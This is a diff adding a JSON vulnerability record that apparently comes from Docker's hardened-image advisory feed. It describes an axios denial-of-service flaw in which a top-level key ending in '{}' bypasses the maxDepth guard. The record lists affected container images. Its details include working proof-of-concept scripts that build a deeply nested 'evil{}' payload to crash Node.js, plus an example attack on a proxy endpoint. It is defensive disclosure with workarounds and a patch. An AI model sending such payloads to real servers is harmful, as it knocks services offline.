@@ -1,0 +1,162 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-iki2-hcmb-z56m-nih7",
+  "modified": "2026-09-21T15:07:24Z",
+  "published": "2026-09-21T15:07:24Z",
+  "upstream": [
+    "GHSA-hcpx-6fm6-wx23"
+  ],
+  "summary": "## Summary",
+  "details": "## Summary\n\nAxios versions in the fixed lines for GHSA-62hf-57xw-28j9 still contain an incomplete depth-limit bypass in `lib/helpers/toFormData.js`. When serializing an object with a top-level key ending in `{}`, axios calls `JSON.stringify()` on that value before the `formSerializer.maxDepth` guard can inspect the nested structure.\n\nAn attacker who can control object keys and nested values passed by an application into axios form or parameter serialization can trigger a raw `RangeError: Maximum call stack size exceeded`, causing a denial of service in the affected request path.\n\n## Impact\n\nThe impact is availability only. No confidentiality or integrity impact was confirmed.\n\nServer-side applications are the primary concern when they accept user-controlled input and pass it into axios as `data` or `params` for `multipart/form-data`, `application/x-www-form-urlencoded`, or default parameter serialization. Browser impact is limited to the page or request context unless the application builds a broader failure mode around the thrown exception.\n\nThe attack requires control over a top-level object key ending in `{}` and a deeply nested object value. The option `formSerializer.metaTokens: false` is not a workaround because it only changes the emitted key name; the value is still stringified.\n\n## Affected Functionality\n\nAffected paths include:\n\n- `lib/helpers/toFormData.js` when a top-level key ends with `{}`.\n- `lib/helpers/toURLEncodedForm.js`, which delegates to `helpers.defaultVisitor`.\n- `lib/helpers/AxiosURLSearchParams.js`, used by default params serialization.\n- Request transforms in `lib/defaults/index.js` when object data is serialized as `multipart/form-data` or `application/x-www-form-urlencoded`.\n\nUnaffected paths include:\n\n- Already-created `FormData` or `URLSearchParams` values that axios does not walk with `toFormData`.\n- Custom `paramsSerializer.serialize` implementations that do not call axios `toFormData`.\n- Non-`{}` deeply nested values in `toFormData`, which hit `ERR_FORM_DATA_DEPTH_EXCEEDED` as intended.\n\n## Technical Details\n\nIn `lib/helpers/toFormData.js`, `defaultVisitor()` handles top-level keys ending in `{}` before recursive traversal:\n\n```js\nif (value && !path && typeof value === 'object') {\n  if (utils.endsWith(key, '{}')) {\n    key = metaTokens ? key : key.slice(0, -2);\n    value = JSON.stringify(value);\n  }\n}\n```\n\nThe depth guard is in `build()`:\n\n```js\nif (depth > maxDepth) {\n  throw new AxiosError(\n    'Object is too deeply nested (' + depth + ' levels). Max depth: ' + maxDepth,\n    AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED\n  );\n}\n```\n\nFor `{}` metatoken values, `build()` only sees the top-level property. The nested value is handed directly to native `JSON.stringify()`, which recurses internally and can throw `RangeError` before axios emits the intended `AxiosError`.\n\n## Proof of Concept of Attack\n\nSafe local PoC with no network I/O:\n\n```js\nimport toFormData from './lib/helpers/toFormData.js';\n\nfunction buildDeep(depth) {\n  const head = {};\n  let cur = head;\n\n  for (let i = 0; i < depth; i += 1) {\n    cur.x = {};\n    cur = cur.x;\n  }\n\n  return head;\n}\n\ntry {\n  toFormData({ 'evil{}': buildDeep(10000) });\n} catch (err) {\n  console.log(err.name, err.code || '', err.message);\n}\n\n// Expected affected result:\n// RangeError  Maximum call stack size exceeded\n```\n\nExpected fixed behavior is an `AxiosError` with code `ERR_FORM_DATA_DEPTH_EXCEEDED`.\n\n## Workarounds\n\nReject or depth-limit untrusted objects before passing them to axios serialization.\n\nStrip or reject top-level keys ending in `{}` from untrusted objects when using axios form serialization.\n\nFor query parameters, use a custom `paramsSerializer.serialize` that enforces a depth limit.\n\nFor form bodies, construct `FormData` or `URLSearchParams` manually after validating input depth.\n\n<details>\n<summary>Original Report</summary>\n\n## Summary\nThe `maxDepth=100` guard added in axios 1.15.0 to fix GHSA-62hf-57xw-28j9 lives inside the `build()` recursion in `lib/helpers/toFormData.js`. The default visitor at `lib/helpers/toFormData.js:166-170` still has a top-level shortcut that calls `JSON.stringify(value)` whenever a key ends in `'{}'`, before `build()` ever sees the nested value. JSON.stringify on a deeply nested object stack-overflows with `RangeError: Maximum call stack size exceeded`, which propagates synchronously out of the axios call. The exact attacker-data flow that the original advisory described (proxy-style code that forwards client JSON into `axios({ data, params })`) still crashes the process at depth ~3000 on a default Node.js stack, despite v1.16.0 being patched.\n\n## Details\nAffected: axios 1.15.0 - 1.16.0 (every released version that carries the GHSA-62hf-57xw-28j9 fix). The bug is reachable from any code path that hits `toFormData`, which includes:\n\n- `axios.post(url, data, { headers: { 'content-type': 'application/x-www-form-urlencoded' } })` -> `defaults.transformRequest` -> `toURLEncodedForm(data)` -> `toFormData`\n- `axios.post(url, data, { headers: { 'content-type': 'multipart/form-data' } })` -> same path via `toFormData`\n- `axios.get(url, { params })` -> `buildURL` -> `new AxiosURLSearchParams(params)` -> `toFormData`\n\nVulnerable code, `lib/helpers/toFormData.js`:\n\n```javascript\n// 156 function defaultVisitor(value, key, path) {\n// 165 if (value && !path && typeof value === 'object') {\n// 166 if (utils.endsWith(key, '{}')) {\n// 167 // eslint-disable-next-line no-param-reassign\n// 168 key = metaTokens ? key : key.slice(0, -2);\n// 169 // eslint-disable-next-line no-param-reassign\n// 170 value = JSON.stringify(value); // <-- V8 native, NOT depth-checked\n// 171 } else if (...\n```\n\n`build()` later does enforce `maxDepth`:\n\n```javascript\n// 211 function build(value, path, depth = 0) {\n// 212 if (utils.isUndefined(value)) return;\n// 213\n// 214 if (depth > maxDepth) {\n// 215 throw new AxiosError(\n// 216 'Object is too deeply nested (' + depth + ' levels). Max depth: ' + maxDepth,\n// 217 AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED\n// 218 );\n```\n\nThe `'{}'` shortcut runs in `defaultVisitor`, which is invoked from inside `build()` for top-level keys (the `!path` clause at line 165 means the shortcut only triggers at top level, where `path` is `undefined`). At that point `depth === 0` and the maxDepth check has already passed; the recursion-aware guard never sees the nested value because `defaultVisitor` reassigns `value = JSON.stringify(value)` and returns the rendered string straight to `formData.append`. JSON.stringify itself is recursive in V8 and stack-overflows on deeply nested objects, throwing `RangeError` synchronously.\n\nThe behaviour is independent of the `metaTokens` option: line 168 only changes whether `'{}'` stays on the key name, line 170 stringifies regardless. `toURLEncodedForm`'s wrapper visitor in `lib/helpers/toURLEncodedForm.js:11-14` falls through to the same `defaultVisitor`, so the form-encoded path is also affected.\n\nThe attacker payload is a single top-level key ending in `'{}'` whose value is a nested object. The keys themselves do not have to be deep, so the payload is small to send (a few KB of `{\"x\":{\"x\":...}}` produces enough nesting to overflow). The original advisory's threat model -- a server that forwards `req.body` or `req.query` into axios -- is unchanged:\n\n```javascript\napp.post('/forward', async (req, res) => {\n await axios.post('https://upstream/api', req.body); // req.body attacker-controlled\n res.send('ok');\n});\n// attacker POST /forward with content-type: application/x-www-form-urlencoded\n// body: {\"evil{}\": <8000-deep object>}\n// -> JSON.stringify recurses inside defaultVisitor -> RangeError -> handler crashes\n```\n\nThe error is not an `AxiosError`; it is a raw `RangeError` thrown from the stringifier, so handlers that look for `err.code === 'ERR_FORM_DATA_DEPTH_EXCEEDED'` (the documented signal that the maxDepth guard fired) do not see it. Synchronous startup paths or worker threads still take the whole process down.\n\nThe fix is to also depth-limit (or pre-walk) the value before calling `JSON.stringify` on line 170, or to remove the top-level `'{}'` shortcut and rely on the depth-checked `build()` recursion to handle it. A minimal patch that preserves observable behaviour for legal payloads:\n\n```diff\n if (utils.endsWith(key, '{}')) {\n // eslint-disable-next-line no-param-reassign\n key = metaTokens ? key : key.slice(0, -2);\n+ // Reject objects that would exceed maxDepth before handing to JSON.stringify,\n+ // which is recursive in V8 and stack-overflows on deeply nested input.\n+ (function checkDepth(v, d) {\n+ if (d > maxDepth) {\n+ throw new AxiosError(\n+ 'Object is too deeply nested (' + d + ' levels). Max depth: ' + maxDepth,\n+ AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED\n+ );\n+ }\n+ if (v && typeof v === 'object') {\n+ for (const k in v) checkDepth(v[k], d + 1);\n+ }\n+ })(value, 0);\n // eslint-disable-next-line no-param-reassign\n value = JSON.stringify(value);\n }\n```\n\n(The recursion in `checkDepth` itself is bounded by `maxDepth`, so it cannot itself overflow.)\n\n## PoC\nReproduces against a clean clone of `axios/axios` at v1.16.0 with `npm install` already run. `targets/axios/poc_jsonstringify_dos.mjs` is the script:\n\n```javascript\nimport axios from './source/index.js';\n\nfunction buildDeep(depth) {\n let head = {};\n let cur = head;\n for (let i = 0; i < depth; i++) { cur.x = {}; cur = cur.x; }\n return head;\n}\n\nconst malicious = buildDeep(5000);\nconst safeAdapter = () => Promise.resolve({\n data: 'never reached', status: 200, statusText: 'OK', headers: {}, config: {}\n});\n\n// 1. POST x-www-form-urlencoded\ntry {\n await axios.post('http://example.test/x',\n { 'evil{}': malicious },\n { headers: { 'content-type': 'application/x-www-form-urlencoded' }, adapter: safeAdapter });\n} catch (e) {\n console.log('POST form-encoded:', e.name, '-', e.message);\n}\n\n// 2. GET with params\ntry {\n await axios.get('http://example.test/x',\n { params: { 'evil{}': malicious }, adapter: safeAdapter });\n} catch (e) {\n console.log('GET params:', e.name, '-', e.message);\n}\n```\n\n3/3 runs reproduce the same `RangeError` on `axios@1.16.0` with Node.js 24:\n\n```\n$ node poc_jsonstringify_dos.mjs\nPOST form-encoded: RangeError - Maximum call stack size exceeded\nGET params: RangeError - Maximum call stack size exceeded\n```\n\n`safeAdapter` is a stub that returns a fake response, so the crash is provably inside axios's serialization layer, not in HTTP I/O. Removing the `'{}'` suffix from the key and re-running gives the expected `AxiosError: Object is too deeply nested ... ERR_FORM_DATA_DEPTH_EXCEEDED` from the maxDepth guard, confirming the fix is wired correctly elsewhere -- it just does not cover this branch.\n\nCrash threshold on a default-stack Node.js process is roughly depth 2500-3000; 8000 is comfortably above that, and the payload is a few KB.\n\n## Impact\nA remote, unauthenticated attacker who can influence an object that the application passes to axios as request `data` or `params` triggers an uncaught `RangeError` from inside the synchronous `JSON.stringify` call in `defaultVisitor`. In server-side applications that proxy or re-forward client JSON through axios -- the same threat model that motivated GHSA-62hf-57xw-28j9 -- this crashes the request handler and, in worker/cluster setups, the whole process. The previously shipped `maxDepth` guard does not stop it because the `'{}'` suffix path bypasses `build()` entirely. Same severity class as the original advisory (CWE-674 Uncontrolled Recursion, network-reachable DoS); the only difference is the attacker has to suffix one of their object keys with `'{}'` to land on the unguarded code path.\n</details>\n\n---",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "airflow",
+        "purl": "pkg:docker/dhi/airflow?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "3.2.1-python3.13-debian13",
+        "3.2.1-python3.13-debian13-compat",
+        "3.2.1-python3.13-debian13-compat-fips",
+        "3.2.1-python3.13-debian13-dev",
+        "3.2.1-python3.13-debian13-fips",
+        "3.2.1-python3.13-debian13-fips-dev",
+        "3.2.2-python3.13-debian13",
+        "3.2.2-python3.13-debian13-compat",
+        "3.2.2-python3.13-debian13-compat-fips",
+        "3.2.2-python3.13-debian13-dev",
+        "3.2.2-python3.13-debian13-fips",
+        "3.2.2-python3.13-debian13-fips-dev",
+        "3.3.0-python3.13-debian13",
+        "3.3.0-python3.13-debian13-compat",
+        "3.3.0-python3.13-debian13-compat-fips",
+        "3.3.0-python3.13-debian13-dev",
+        "3.3.0-python3.13-debian13-fips",
+        "3.3.0-python3.13-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "firecrawl-mcp",
+        "purl": "pkg:docker/dhi/firecrawl-mcp?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "3.2.1-debian13"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "grist",
+        "purl": "pkg:docker/dhi/grist?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.7.13-debian13",
+        "1.7.13-debian13-dev",
+        "1.7.15-debian13",
+        "1.7.15-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kibana",
+        "purl": "pkg:docker/dhi/kibana?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "9.1.10-debian13",
+        "9.2.8-debian13",
+        "9.3.4-debian13",
+        "9.3.5-debian13",
+        "9.3.7-debian13",
+        "9.3.8-debian13",
+        "9.4.1-debian13",
+        "9.4.2-debian13",
+        "9.4.3-debian13",
+        "9.4.4-debian13"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "uptime-kuma",
+        "purl": "pkg:docker/dhi/uptime-kuma?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.23.17-debian13",
+        "1.23.17-debian13-dev",
+        "2.4.0-debian13",
+        "2.4.0-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-iki2-hcmb-z56m-nih7"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-hcpx-6fm6-wx23"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-69125"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-67321"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/axios/axios/security/advisories/GHSA-hcpx-6fm6-wx23"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/axios/axios/pull/11001"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/axios/axios/pull/11000"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/axios/axios/releases/tag/v1.18.0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/axios/axios/releases/tag/v0.33.0"
+    }
+  ]
+}
